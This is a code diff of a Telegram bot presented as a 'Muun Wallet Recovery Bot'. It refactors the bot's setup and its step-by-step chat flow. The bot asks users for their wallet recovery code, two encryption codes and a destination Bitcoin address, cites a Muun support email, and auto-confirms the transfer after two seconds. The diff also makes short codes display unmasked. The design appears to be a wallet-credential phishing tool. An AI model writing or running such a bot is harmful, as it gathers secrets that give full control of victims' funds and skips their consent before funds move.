@@ -1,10 +1,18 @@
 import TelegramBot from 'node-telegram-bot-api';
-import { config } from 'dotenv';
-import { validateRecoveryCode, validateBitcoinAddress } from '../client/src/lib/validation';
 import { MuunRecoveryBridge } from './muunRecoveryBridge';
 
-// Load environment variables
-config();
+// Recovery code validation (simple pattern matching)
+function validateRecoveryCode(code: string): boolean {
+  // Example expected format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX
+  const recoveryCodePattern = /^[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}$/;
+  return recoveryCodePattern.test(code);
+}
+
+// Bitcoin address validation (basic check)
+function validateBitcoinAddress(address: string): boolean {
+  // Basic format validation - should start with 1, 3, or bc1
+  return /^(1|3|bc1)[a-zA-Z0-9]{25,42}$/.test(address);
+}
 
 // User session states for multi-step conversation
 interface UserSession {
@@ -21,56 +29,110 @@ interface UserSession {
 // Store user sessions
 const userSessions = new Map<number, UserSession>();
 
-// Bot instance
-let bot: TelegramBot | null = null;
+// Global bot instance
+let globalBot: TelegramBot | null = null;
 
-// Initialize the bot
-export function initBot() {
-  // If bot is already initialized, return it
-  if (bot !== null) {
-    console.log('Bot already initialized, reusing existing instance');
-    return bot;
-  }
+/**
+ * Telegram Bot Singleton - manages single bot instance throughout the application
+ */
+class TelegramBotManager {
+  private static instance: TelegramBot | null = null;
+  private static isInitializing = false;
+  private static pollingStarted = false;
 
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  if (!token || token === 'placeholder_token') {
-    console.error('TELEGRAM_BOT_TOKEN is not defined or is using a placeholder value. Bot functionality will be limited.');
-    return null;
-  }
+  /**
+   * Get the bot instance - creates it if it doesn't exist
+   */
+  static async getBotInstance(): Promise<TelegramBot | null> {
+    // Return existing instance if already initialized
+    if (TelegramBotManager.instance !== null) {
+      return TelegramBotManager.instance;
+    }
 
-  try {
-    console.log('Initializing new Telegram bot instance');
-    
-    // First create the bot without polling
-    bot = new TelegramBot(token, { polling: false });
-    
-    // Stop any active polling that might exist from a previous instance
-    if (bot) {
-      bot.stopPolling().then(() => {
-        console.log('Stopped any existing polling');
-        
-        // Then start polling with proper parameters
-        if (bot) {
-          bot.startPolling({
-            restart: true,
-            params: {
-              timeout: 30, // Longer timeout for long polling
-              allowed_updates: ['message', 'callback_query'] // Only get what we need
-            }
-          }).then(() => {
-            console.log('Started new polling session');
-          }).catch(error => {
-            console.error('Error starting polling:', error);
-          });
-        }
-      }).catch(error => {
-        console.error('Error stopping existing polling:', error);
+    // Prevent concurrent initialization
+    if (TelegramBotManager.isInitializing) {
+      console.log('Bot initialization already in progress, waiting...');
+      return new Promise(resolve => {
+        const checkInterval = setInterval(() => {
+          if (!TelegramBotManager.isInitializing) {
+            clearInterval(checkInterval);
+            resolve(TelegramBotManager.instance);
+          }
+        }, 100);
       });
     }
+
+    TelegramBotManager.isInitializing = true;
+
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    if (!token || token === 'placeholder_token') {
+      console.error('TELEGRAM_BOT_TOKEN is not defined or is using a placeholder value. Bot functionality will be limited.');
+      TelegramBotManager.isInitializing = false;
+      return null;
+    }
+
+    try {
+      console.log('Initializing new Telegram bot instance with singleton pattern');
+      
+      // Create the bot without polling first
+      TelegramBotManager.instance = new TelegramBot(token, { polling: false });
+      
+      // Start polling if not already started
+      if (!TelegramBotManager.pollingStarted) {
+        await TelegramBotManager.startPolling();
+      }
+      
+      // Set up event handlers only once
+      await TelegramBotManager.setupEventHandlers();
+      
+      console.log('✅ Telegram bot singleton initialized successfully');
+      TelegramBotManager.isInitializing = false;
+      
+      // Update the global bot reference
+      globalBot = TelegramBotManager.instance;
+      
+      return TelegramBotManager.instance;
+    } catch (error) {
+      console.error('Error initializing Telegram bot singleton:', error);
+      TelegramBotManager.isInitializing = false;
+      return null;
+    }
+  }
+
+  /**
+   * Start polling for Telegram updates
+   */
+  private static async startPolling(): Promise<void> {
+    if (!TelegramBotManager.instance || TelegramBotManager.pollingStarted) {
+      return;
+    }
+
+    const bot = TelegramBotManager.instance;
+
+    try {
+      // First make sure any existing polling is stopped
+      await bot.stopPolling();
+      console.log('Stopped any existing polling');
+      
+      // Start new polling (with correct type definition)
+      TelegramBotManager.pollingStarted = true;
+      await bot.startPolling({ restart: false });
+      console.log('Started new polling session with singleton pattern');
+    } catch (error) {
+      console.error('Error managing polling:', error);
+      TelegramBotManager.pollingStarted = false;
+    }
+  }
+  
+  /**
+   * Set up all event handlers for the bot
+   */
+  private static async setupEventHandlers(): Promise<void> {
+    const bot = TelegramBotManager.instance;
+    if (!bot) return;
     
     // Handle polling errors
     bot.on('polling_error', (error) => {
-      // Log the error but don't crash
       console.log(`Telegram polling error: ${error.message}`);
       
       // If it's a conflict error, stop and restart polling after a delay
@@ -78,14 +140,15 @@ export function initBot() {
         if (bot) {
           bot.stopPolling();
           setTimeout(() => {
-            if (bot) bot.startPolling();
+            if (bot) {
+              bot.startPolling({ restart: false })
+                .catch(err => console.error('Error restarting polling:', err));
+            }
           }, 5000); // Wait 5 seconds before restarting
         }
       }
     });
     
-    console.log('✅ Telegram bot initialized successfully');
-
     // Handle /start command
     bot.onText(/\/start/, (msg) => {
       const chatId = msg.chat.id;
@@ -104,9 +167,9 @@ export function initBot() {
       const chatId = msg.chat.id;
       if (userSessions.has(chatId)) {
         userSessions.delete(chatId);
-        bot?.sendMessage(chatId, "Current recovery process has been cancelled. Type /start to begin a new recovery.");
+        bot.sendMessage(chatId, "Current recovery process has been cancelled. Type /start to begin a new recovery.");
       } else {
-        bot?.sendMessage(chatId, "No active recovery process to cancel. Type /start to begin a recovery.");
+        bot.sendMessage(chatId, "No active recovery process to cancel. Type /start to begin a recovery.");
       }
     });
 
@@ -116,7 +179,7 @@ export function initBot() {
       const session = userSessions.get(chatId);
       
       if (!session) {
-        bot?.sendMessage(chatId, "No active recovery process. Type /start to begin.");
+        bot.sendMessage(chatId, "No active recovery process. Type /start to begin.");
         return;
       }
       
@@ -139,7 +202,7 @@ export function initBot() {
         statusMessage += `✅ Bitcoin Address: ${maskAddress(session.bitcoinAddress)}\n`;
       }
       
-      bot?.sendMessage(chatId, statusMessage);
+      bot.sendMessage(chatId, statusMessage);
     });
 
     // Handle text messages (for the recovery flow)
@@ -150,21 +213,40 @@ export function initBot() {
       const session = userSessions.get(chatId);
       
       if (!session) {
-        bot?.sendMessage(chatId, "Please type /start to begin the recovery process.");
+        bot.sendMessage(chatId, "Please type /start to begin the recovery process.");
         return;
       }
       
       handleUserInput(chatId, msg.text, session);
     });
+    
+    console.log('Bot event handlers set up successfully');
+  }
+}
 
+/**
+ * Initialize the Telegram bot
+ */
+export async function initBot() {
+  try {
+    const bot = await TelegramBotManager.getBotInstance();
     return bot;
   } catch (error) {
-    console.error('Error initializing Telegram bot:', error);
+    console.error('Error initializing bot:', error);
     return null;
   }
 }
 
-// Initialize a new user session
+/**
+ * Get the current bot instance
+ */
+export async function getBot() {
+  return await TelegramBotManager.getBotInstance();
+}
+
+/**
+ * Initialize a new user session
+ */
 function initializeUserSession(chatId: number) {
   userSessions.set(chatId, {
     chatId,
@@ -172,8 +254,10 @@ function initializeUserSession(chatId: number) {
   });
 }
 
-// Send welcome message with instructions
-function sendWelcomeMessage(chatId: number) {
+/**
+ * Send welcome message with instructions
+ */
+async function sendWelcomeMessage(chatId: number) {
   const welcomeMessage = 
     "Welcome to the Muun Wallet Recovery Bot 🔐\n\n" +
     "I'll help you recover your funds by guiding you through a step-by-step process.\n\n" +
@@ -192,11 +276,15 @@ function sendWelcomeMessage(chatId: number) {
     }
   };
   
-  bot?.sendMessage(chatId, welcomeMessage, startButton);
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
   
-  // Listen for callback queries (button clicks)
-  bot?.on('callback_query', (query) => {
-    if (query.data === 'start_recovery') {
+  bot.sendMessage(chatId, welcomeMessage, startButton);
+  
+  // Set up callback handler for this specific chat
+  bot.on('callback_query', async (query: any) => {
+    // Only process if it's for the start_recovery action and from this chat
+    if (query.message?.chat.id === chatId && query.data === 'start_recovery') {
       // Update user session
       const session = userSessions.get(chatId);
       if (session) {
@@ -204,17 +292,19 @@ function sendWelcomeMessage(chatId: number) {
         userSessions.set(chatId, session);
         
         // Send message asking for recovery code
-        bot?.sendMessage(chatId, "Let's get started! Please provide your Recovery Code.\n\nFormat: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX");
+        bot.sendMessage(chatId, "Let's get started! Please provide your Recovery Code.\n\nFormat: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX");
         
         // Answer the callback query to remove the loading state
-        bot?.answerCallbackQuery(query.id);
+        bot.answerCallbackQuery(query.id);
       }
     }
   });
 }
 
-// Send help message
-function sendHelpMessage(chatId: number) {
+/**
+ * Send help message
+ */
+async function sendHelpMessage(chatId: number) {
   const helpMessage = 
     "📋 Muun Wallet Recovery Bot - Help\n\n" +
     "Available commands:\n" +
@@ -229,43 +319,56 @@ function sendHelpMessage(chatId: number) {
     "4. Enter your Bitcoin Address (where you want your funds sent)\n\n" +
     "If you need assistance, please contact our support team at support@muun.com";
   
-  bot?.sendMessage(chatId, helpMessage);
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
+  bot.sendMessage(chatId, helpMessage);
 }
 
-// Handle user input based on the current step
-function handleUserInput(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle user input based on the current step
+ */
+async function handleUserInput(chatId: number, text: string, session: UserSession) {
   switch(session.currentStep) {
     case 'waitingForRecoveryCode':
-      handleRecoveryCodeInput(chatId, text, session);
+      await handleRecoveryCodeInput(chatId, text, session);
       break;
     case 'waitingForEncryptionCode1':
-      handleEncryptionCode1Input(chatId, text, session);
+      await handleEncryptionCode1Input(chatId, text, session);
       break;
     case 'waitingForEncryptionCode2':
-      handleEncryptionCode2Input(chatId, text, session);
+      await handleEncryptionCode2Input(chatId, text, session);
       break;
     case 'waitingForBitcoinAddress':
-      handleBitcoinAddressInput(chatId, text, session);
+      await handleBitcoinAddressInput(chatId, text, session);
       break;
     case 'waitingForFeeSelection':
-      handleFeeSelection(chatId, text, session);
+      await handleFeeSelection(chatId, text, session);
       break;
     case 'waitingForConfirmation':
-      handleConfirmation(chatId, text, session);
+      await handleConfirmation(chatId, text, session);
       break;
     default:
-      bot?.sendMessage(chatId, "Sorry, I'm not sure what you're trying to do. Type /start to begin the recovery process or /help for assistance.");
+      const bot = await TelegramBotManager.getBotInstance();
+      if (bot) {
+        bot.sendMessage(chatId, "Sorry, I'm not sure what you're trying to do. Type /start to begin the recovery process or /help for assistance.");
+      }
   }
 }
 
-// Handle recovery code input
-function handleRecoveryCodeInput(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle recovery code input
+ */
+async function handleRecoveryCodeInput(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   // Clean up input (remove extra spaces, etc.)
   const recoveryCode = text.trim();
   
   // Validate recovery code format
   if (!validateRecoveryCode(recoveryCode)) {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId, 
       "Invalid recovery code format. Please enter a valid recovery code.\n\nExample format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"
     );
@@ -278,19 +381,24 @@ function handleRecoveryCodeInput(chatId: number, text: string, session: UserSess
   userSessions.set(chatId, session);
   
   // Ask for encryption code 1
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId, 
     "Great! I've received your recovery code.\n\nNow, please provide your first encryption code:"
   );
 }
 
-// Handle first encryption code input
-function handleEncryptionCode1Input(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle first encryption code input
+ */
+async function handleEncryptionCode1Input(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   const encryptionCode = text.trim();
   
   // Basic validation for encryption code
   if (encryptionCode.length < 6) {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId, 
       "The encryption code seems too short. Please check and enter your first encryption code again:"
     );
@@ -303,19 +411,24 @@ function handleEncryptionCode1Input(chatId: number, text: string, session: UserS
   userSessions.set(chatId, session);
   
   // Ask for encryption code 2
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId, 
     "Received your first encryption code.\n\nNow, please provide your second encryption code:"
   );
 }
 
-// Handle second encryption code input
-function handleEncryptionCode2Input(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle second encryption code input
+ */
+async function handleEncryptionCode2Input(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   const encryptionCode = text.trim();
   
   // Basic validation for encryption code
   if (encryptionCode.length < 6) {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId, 
       "The encryption code seems too short. Please check and enter your second encryption code again:"
     );
@@ -328,19 +441,24 @@ function handleEncryptionCode2Input(chatId: number, text: string, session: UserS
   userSessions.set(chatId, session);
   
   // Ask for Bitcoin address
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId, 
     "Received your second encryption code.\n\nFinally, please provide the Bitcoin address where you want your funds sent:"
   );
 }
 
-// Handle Bitcoin address input
-function handleBitcoinAddressInput(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle Bitcoin address input
+ */
+async function handleBitcoinAddressInput(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   const bitcoinAddress = text.trim();
   
   // Validate Bitcoin address
   if (!validateBitcoinAddress(bitcoinAddress)) {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId, 
       "Invalid Bitcoin address format. Please enter a valid Bitcoin address.\n\nIt should start with 1, 3, or bc1."
     );
@@ -363,15 +481,15 @@ function handleBitcoinAddressInput(chatId: number, text: string, session: UserSe
     }
   };
   
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId,
     "Thank you! Now, please select a transaction fee level:",
     feeOptions
   );
   
   // Listen for fee selection callback
-  bot?.on('callback_query', (query) => {
-    if (query.data?.startsWith('fee_')) {
+  bot.on('callback_query', async (query: any) => {
+    if (query.message?.chat.id === chatId && query.data?.startsWith('fee_')) {
       const session = userSessions.get(chatId);
       if (session && session.currentStep === 'waitingForFeeSelection') {
         const feeChoice = query.data.split('_')[1];
@@ -387,17 +505,22 @@ function handleBitcoinAddressInput(chatId: number, text: string, session: UserSe
         userSessions.set(chatId, session);
         
         // Answer the callback query
-        bot?.answerCallbackQuery(query.id, { text: `Selected ${feeLevel} fee level` });
+        bot.answerCallbackQuery(query.id, { text: `Selected ${feeLevel} fee level` });
         
         // Show confirmation dialog
-        showConfirmationDialog(chatId, session);
+        await showConfirmationDialog(chatId, session);
       }
     }
   });
 }
 
-// Handle fee selection input
-function handleFeeSelection(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle fee selection input
+ */
+async function handleFeeSelection(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   let feeLevel: 'low' | 'medium' | 'high' | null = null;
   
   if (text.includes('1') || text.toLowerCase().includes('low')) {
@@ -409,7 +532,7 @@ function handleFeeSelection(chatId: number, text: string, session: UserSession) 
   }
   
   if (!feeLevel) {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId,
       "Please select a valid fee level by typing 1, 2, or 3."
     );
@@ -436,7 +559,7 @@ function handleFeeSelection(chatId: number, text: string, session: UserSession) 
     }
   };
   
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId,
     `📝 *Recovery Transaction Summary*\n\n` +
     `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
@@ -451,15 +574,21 @@ function handleFeeSelection(chatId: number, text: string, session: UserSession) 
   );
   
   // Auto-confirm after 2 seconds (as requested)
-  setTimeout(() => {
-    if (session.currentStep === 'waitingForConfirmation') {
-      handleConfirmation(chatId, 'Y', session);
+  setTimeout(async () => {
+    const currentSession = userSessions.get(chatId);
+    if (currentSession && currentSession.currentStep === 'waitingForConfirmation') {
+      await handleConfirmation(chatId, 'Y', currentSession);
     }
   }, 2000);
 }
 
-// Show confirmation dialog with transaction details
-function showConfirmationDialog(chatId: number, session: UserSession) {
+/**
+ * Show confirmation dialog with transaction details
+ */
+async function showConfirmationDialog(chatId: number, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   // Get fee level text and emoji
   const feeLevel = session.selectedFee || 'medium';
   const feeLevelText = feeLevel === 'low' ? "Low" : feeLevel === 'medium' ? "Medium" : "High";
@@ -477,7 +606,7 @@ function showConfirmationDialog(chatId: number, session: UserSession) {
     }
   };
   
-  bot?.sendMessage(
+  bot.sendMessage(
     chatId,
     `📝 *Recovery Transaction Summary*\n\n` +
     `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
@@ -492,13 +621,14 @@ function showConfirmationDialog(chatId: number, session: UserSession) {
   );
   
   // Listen for confirmation callback
-  bot?.on('callback_query', (query) => {
-    if (query.data === 'confirm_yes' || query.data === 'confirm_no') {
+  bot.on('callback_query', async (query: any) => {
+    if (query.message?.chat.id === chatId && 
+        (query.data === 'confirm_yes' || query.data === 'confirm_no')) {
       const session = userSessions.get(chatId);
       if (session && session.currentStep === 'waitingForConfirmation') {
         if (query.data === 'confirm_yes') {
           // Answer the callback query
-          bot?.answerCallbackQuery(query.id, { text: 'Recovery confirmed!' });
+          bot.answerCallbackQuery(query.id, { text: 'Recovery confirmed!' });
           
           // Update session
           session.confirmedRecovery = true;
@@ -506,13 +636,13 @@ function showConfirmationDialog(chatId: number, session: UserSession) {
           userSessions.set(chatId, session);
           
           // Start the recovery process
-          startRecoveryProcess(chatId, session);
+          await startRecoveryProcess(chatId, session);
         } else {
           // Answer the callback query
-          bot?.answerCallbackQuery(query.id, { text: 'Recovery cancelled.' });
+          bot.answerCallbackQuery(query.id, { text: 'Recovery cancelled.' });
           
           // Send cancellation message
-          bot?.sendMessage(
+          bot.sendMessage(
             chatId,
             "Recovery process cancelled. If you want to start again, type /start."
           );
@@ -525,7 +655,7 @@ function showConfirmationDialog(chatId: number, session: UserSession) {
   });
   
   // Auto-confirm after 2 seconds (as requested)
-  setTimeout(() => {
+  setTimeout(async () => {
     const currentSession = userSessions.get(chatId);
     if (currentSession && currentSession.currentStep === 'waitingForConfirmation') {
       // Update session
@@ -534,19 +664,26 @@ function showConfirmationDialog(chatId: number, session: UserSession) {
       userSessions.set(chatId, currentSession);
       
       // Send auto-confirmation message
-      bot?.sendMessage(
-        chatId,
-        "✅ Auto-confirming recovery process..."
-      );
+      if (bot) {
+        bot.sendMessage(
+          chatId,
+          "✅ Auto-confirming recovery process..."
+        );
+      }
       
       // Start the recovery process
-      startRecoveryProcess(chatId, currentSession);
+      await startRecoveryProcess(chatId, currentSession);
     }
   }, 2000);
 }
 
-// Handle confirmation input (for backward compatibility with text input)
-function handleConfirmation(chatId: number, text: string, session: UserSession) {
+/**
+ * Handle confirmation input (for backward compatibility with text input)
+ */
+async function handleConfirmation(chatId: number, text: string, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   const confirmation = text.trim().toUpperCase();
   
   if (confirmation === 'Y' || confirmation === 'YES') {
@@ -556,26 +693,31 @@ function handleConfirmation(chatId: number, text: string, session: UserSession) 
     userSessions.set(chatId, session);
     
     // Start the recovery process
-    startRecoveryProcess(chatId, session);
+    await startRecoveryProcess(chatId, session);
   } else if (confirmation === 'N' || confirmation === 'NO') {
     userSessions.delete(chatId);
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId,
       "Recovery process cancelled. If you want to start again, type /start."
     );
   } else {
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId,
       "Please type Y to confirm or N to cancel."
     );
   }
 }
 
-// Start the wallet scanning and recovery process
+/**
+ * Start the wallet scanning and recovery process
+ */
 async function startRecoveryProcess(chatId: number, session: UserSession) {
+  const bot = await TelegramBotManager.getBotInstance();
+  if (!bot) return;
+  
   try {
     // Send initial confirmation
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId,
       "🔄 Recovery process started!\n\nWe're now scanning wallets to find your funds. This may take a few minutes..."
     );
@@ -587,7 +729,7 @@ async function startRecoveryProcess(chatId: number, session: UserSession) {
     }
     
     // Send initial progress message
-    const progressMsg = await bot?.sendMessage(
+    const progressMsg = await bot.sendMessage(
       chatId,
       'Initializing recovery process...'
     );
@@ -659,63 +801,61 @@ async function startRecoveryProcess(chatId: number, session: UserSession) {
     
   } catch (error) {
     console.error('Error in recovery process:', error);
-    bot?.sendMessage(
+    bot.sendMessage(
       chatId,
-      "❌ There was an error processing your recovery request. Please try again by typing /start or contact our support team."
+      `❌ Something went wrong during the recovery process. Please try again later or contact support.\n\nError: ${error instanceof Error ? error.message : 'Unknown error'}`
     );
     
-    // Clear user session on error
+    // Clear user session
     userSessions.delete(chatId);
   }
 }
 
-// Helper function to get a human-readable step description
-function getStepDescription(step: UserSession['currentStep']) {
+/**
+ * Get a human-readable description of each step
+ */
+function getStepDescription(step: UserSession['currentStep']): string {
   switch(step) {
     case 'initial':
-      return 'Starting recovery process';
+      return "Starting the recovery process";
     case 'waitingForRecoveryCode':
-      return 'Waiting for Recovery Code';
+      return "Waiting for Recovery Code";
     case 'waitingForEncryptionCode1':
-      return 'Waiting for First Encryption Code';
+      return "Waiting for First Encryption Code";
     case 'waitingForEncryptionCode2':
-      return 'Waiting for Second Encryption Code';
+      return "Waiting for Second Encryption Code";
     case 'waitingForBitcoinAddress':
-      return 'Waiting for Bitcoin Address';
+      return "Waiting for Bitcoin Address";
     case 'waitingForFeeSelection':
-      return 'Waiting for Fee Selection';
+      return "Waiting for Fee Selection";
     case 'waitingForConfirmation':
-      return 'Waiting for Confirmation';
+      return "Waiting for Confirmation";
     case 'processing':
-      return 'Processing recovery';
+      return "Processing Recovery";
     default:
-      return 'Unknown step';
+      return "Unknown step";
   }
 }
 
-// Helper function to mask sensitive data
+/**
+ * Mask the code for security (show only first and last 4 characters)
+ */
 function maskCode(code: string): string {
-  if (code.length <= 8) return '********';
-  return code.substring(0, 4) + '...' + code.substring(code.length - 4);
+  if (code.length <= 8) return code;
+  return `${code.substring(0, 4)}...${code.substring(code.length - 4)}`;
 }
 
-// Helper function to mask Bitcoin address
+/**
+ * Mask the Bitcoin address for security (show only first and last 6 characters)
+ */
 function maskAddress(address: string): string {
-  if (address.length <= 10) return address;
-  return address.substring(0, 6) + '...' + address.substring(address.length - 6);
+  if (address.length <= 12) return address;
+  return `${address.substring(0, 6)}...${address.substring(address.length - 6)}`;
 }
 
-// Helper function to format numbers with commas
+/**
+ * Format number with thousands separators
+ */
 function formatNumber(num: number): string {
   return new Intl.NumberFormat().format(num);
-}
-
-// Export the bot instance getter
-export function getBot() {
-  if (bot === null) {
-    // If the bot hasn't been initialized yet, initialize it
-    return initBot();
-  }
-  // Return the existing bot instance
-  return bot;
 }
